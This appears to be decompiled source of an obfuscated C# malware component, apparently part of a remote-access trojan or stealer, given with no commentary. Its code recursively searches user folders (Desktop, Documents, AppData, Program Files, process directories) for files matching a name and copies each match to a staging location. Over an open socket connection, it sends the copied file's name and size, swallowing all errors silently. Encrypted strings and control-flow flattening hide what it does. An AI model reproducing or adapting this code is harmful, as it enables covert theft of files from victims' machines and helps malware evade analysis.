using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;

public class _____________________
{
	public string _;

	public string __;

	public _____________________()
	{
	}

	public void _()
	{
		string str;
		string[] _____________ = null;
		string str1;
		List<string>.Enumerator enumerator = new List<string>.Enumerator();
		int num = 0;
		string str2 = null;
		int length = 0;
		int num1 = 0;
		FileInfo fileInfo = null;
		int num2 = 0;
		object obj;
		object length1;
		int num3;
		try
		{
			str = <Module>.____<string>(-306716383);
			if (this.__.Contains(<Module>.___<string>(-212355870)))
			{
				length = -28106;
				if (Type.EmptyTypes.Length + -2882 != -2882)
				{
					goto Label8;
				}
				str = this.__.Replace(<Module>.______<string>(1838639162), string.Empty);
				length1 = Type.EmptyTypes.Length + 2;
				goto Label0;
			}
		Label8:
			str1 = this._;
			if (Operators.CompareString(str1, <Module>.____<string>(-1536023771), false) != 0)
			{
				goto Label2;
			}
			length = Type.EmptyTypes.Length + 26996;
		Label6:
			this._ = string.Concat(Environment.GetEnvironmentVariable(<Module>.____<string>(2121464145)), <Module>.______<string>(824110388));
			if ((3134 + 84224 * length & 56) == 56)
			{
				if (length == 26996)
				{
					goto Label3;
				}
			}
		Label7:
			this._ = Path.GetTempPath();
			goto Label3;
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
		return;
	Label0:
		switch (length1)
		{
			case 0:
			{
				goto Label4;
			}
			case 1:
			case 6:
			case 7:
			{
				goto Label3;
			}
			case 3:
			{
				goto Label6;
			}
			case 4:
			{
				goto Label7;
			}
			case 5:
			{
				goto Label8;
			}
			case 8:
			{
				goto Label9;
			}
			default:
			{
				goto Label5;
			}
		}
		if (Operators.CompareString(str1, <Module>.______<string>(-829925790), false) == 0)
		{
			length = Type.EmptyTypes.Length + 15922;
			length1 = Type.EmptyTypes.Length + 0;
			goto Label0;
		}
		else if (Operators.CompareString(str1, <Module>.____<string>(1848375827), false) == 0)
		{
			length1 = Type.EmptyTypes.Length + 8;
			goto Label0;
		}
		else if (Operators.CompareString(str1, <Module>._____<string>(1431010491), false) != 0)
		{
			if (Operators.CompareString(str1, <Module>._______<string>(-2037548158), false) == 0)
			{
				goto Label11;
			}
			if (Operators.CompareString(str1, <Module>._______<string>(-922726923), false) != 0)
			{
				if (Operators.CompareString(str1, <Module>._____<string>(-51096871), false) == 0)
				{
					goto Label12;
				}
				if (Operators.CompareString(str1, <Module>.___<string>(352640885), false) == 0)
				{
					length = 22870;
					if (sizeof(short) + -15493 == -15942)
					{
						goto Label5;
					}
					this._ = string.Concat(Environment.GetEnvironmentVariable(<Module>.____<string>(1704223106)), <Module>._____<string>(305124521));
				}
			}
			else
			{
				length = 6259;
				if (Type.EmptyTypes.Length + 12329 == 12329)
				{
					this._ = string.Concat(Environment.GetFolderPath(Environment.SpecialFolder.Personal), <Module>._____<string>(305124521));
					if ((~(num / 24460871) & 134221207) != 0)
					{
						if (length == 16707)
						{
							goto Label4;
						}
					}
				}
			}
		}
		else
		{
			length1 = Type.EmptyTypes.Length + 4;
			goto Label0;
		}
	Label3:
		if (this._.Contains(<Module>._______<string>(411184504)))
		{
			this._ = this.__(this._.Replace(<Module>.______<string>(-176601469), string.Empty));
			string str3 = this._;
			num2 = checked((int)48170);
			if (Operators.CompareString(str3, <Module>.__________(47111, num2, (num2 * -536870912 == 7211 ? (int)(sizeof(ulong) + 1505125774) : 30)), false) == 0)
			{
				return;
			}
		}
		try
		{
			enumerator = this.___(this._).GetEnumerator();
			while (enumerator.MoveNext())
			{
				string current = enumerator.Current;
				try
				{
					if (Operators.CompareString(Path.GetFileName(current).ToLower(), this.__, false) == 0 | Path.GetFileName(current).ToLower().Contains(str))
					{
						int num4 = 5025;
						if (sizeof(long) + 14847 == -16267)
						{
							goto Label14;
						}
					Label16:
						A.i0 = -1748580011;
						str2 = string.Concat(______________________._____, Path.GetFileName(current));
						if (16354 * length - 4443 != length * 218 + 954255650 + length * 38 >> 3)
						{
							goto Label15;
						}
						obj = sizeof(Guid) + 1409053826;
					Label19:
						switch (obj)
						{
							case 1:
							{
								goto Label18;
							}
							case 2:
							{
								_____________[0] = <Module>.____<string>(-558208886);
								_____________[1] = ______________________________________________________________.________________________;
								int num5 = num4;
								num4 = -598;
								if (num5 == -17647)
								{
									goto Label16;
								}
								do
								{
									_____________[2] = <Module>.___<string>(-1617572493);
									_____________[3] = Path.GetFileName(str2);
								}
								while (num4 == -8949);
								goto Label14;
							}
							case 3:
							{
								_____________[6] = <Module>.____<string>(-1286171096);
								_____________[7] = fileInfo.Length.ToString();
								_____________[8] = <Module>._____<string>(561647944);
								______________________________________________________________.___________(string.Concat(_____________));
								Thread.Sleep(2000);
								goto Label17;
							}
						}
					Label15:
						do
						{
							if (File.Exists(str2))
							{
								goto Label17;
							}
							_____________._.FileSystem.CopyFile(current, str2);
							if (((num1 << 19 >> 19 ^ num1 - 2) & 1) == 0)
							{
								continue;
							}
							obj = Type.EmptyTypes.Length + -2000709831;
							goto Label19;
						}
						while ((<Module>.________________ << 16 ^ 6720) - 576863472 == num2 % 29037696 >> 25);
					Label18:
						fileInfo = new FileInfo(str2);
						if (!______________________________________________________________.__.Connected)
						{
							goto Label17;
						}
						_____________ = new string[9];
						num4 = 32756;
						obj = Type.EmptyTypes.Length + 2;
						goto Label19;
					}
				Label17:
				}
				catch (Exception exception1)
				{
					ProjectData.SetProjectError(exception1);
					ProjectData.ClearProjectError();
				}
			}
			return;
		}
		finally
		{
			((IDisposable)enumerator).Dispose();
		}
	Label4:
		this._ = string.Concat(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), <Module>._____<string>(305124521));
		if ((-4097 | 9486 + num1 % 106) == -4097)
		{
			if (length == -261)
			{
				goto Label10;
			}
			goto Label3;
		}
		else
		{
			goto Label3;
		}
	Label10:
		this._ = string.Concat(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), <Module>.___<string>(-675643736));
		length1 = Type.EmptyTypes.Length + 1;
		goto Label0;
	Label5:
		this.__ = this.__.Replace(<Module>._______<string>(1033052807), string.Empty);
		length1 = checked((int)5);
		goto Label0;
	Label9:
		this._ = string.Concat(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), <Module>.___<string>(-675643736));
		if ((num1 << 22) - 6662 != 7943)
		{
			if ((num2 / 800795433 ^ 3358) == -2013709166)
			{
				goto Label5;
			}
			if ((57 + (length >> 27) | -5633) == -5633)
			{
				goto Label3;
			}
			length1 = Type.EmptyTypes.Length + -1443974987;
			goto Label0;
		}
		else
		{
			goto Label5;
		}
	Label11:
		length = 10362;
		num = -28051;
		this._ = string.Concat(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), <Module>._______<string>(-867954375));
		length1 = sizeof(long) + -1;
		goto Label0;
	Label12:
		length = -2850;
		if ((5693 ^ num) != 0 || (3472 + num & 2126778148) != 0)
		{
			num3 = -25144;
		}
		else
		{
			num3 = ((12808 ^ num1 % 3 + (num1 >> 28)) == 0 ? (int)(sizeof(long) + 1077614949) : -413368447);
		}
		if (num3 == 14045)
		{
			goto Label9;
		}
		goto Label10;
	Label14:
		_____________[4] = <Module>._______<string>(-1405665024);
		_____________[5] = str2;
		obj = Type.EmptyTypes.Length + 3;
		goto Label19;
	}

	public string __(string string_0)
	{
		string str;
		try
		{
			Process[] processesByName = Process.GetProcessesByName(string_0);
			str = (checked((int)processesByName.Length) <= 0 ? <Module>.__________(Type.EmptyTypes.Length + 8178, (int)(sizeof(long) + 9252), (int)(sizeof(byte) + 217)) : Path.GetDirectoryName(processesByName[0].MainModule.FileName));
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			int length = Type.EmptyTypes.Length + 18796;
			int ________ = <Module>._______________;
			str = <Module>.__________(length, 19531, ((6 * ________ + ________ * 122 ^ 1866) == 0 ? Type.EmptyTypes.Length + 1989769347 : (int)(sizeof(float) + 151)));
			ProjectData.ClearProjectError();
		}
		return str;
	}

	private List<string> ___(string string_0)
	{
		List<string> strs = new List<string>();
		try
		{
			string[] files = Directory.GetFiles(string_0);
			for (int i = 0; i < checked((int)files.Length); i++)
			{
				string str = files[i];
				try
				{
					strs.Add(str);
				}
				catch (Exception exception)
				{
					ProjectData.SetProjectError(exception);
					ProjectData.ClearProjectError();
				}
			}
			string[] directories = Directory.GetDirectories(string_0);
			for (int j = 0; j < checked((int)directories.Length); j++)
			{
				string str1 = directories[j];
				try
				{
					strs.AddRange(this.___(str1));
				}
				catch (Exception exception1)
				{
					ProjectData.SetProjectError(exception1);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception exception2)
		{
			ProjectData.SetProjectError(exception2);
			ProjectData.ClearProjectError();
		}
		return strs;
	}
}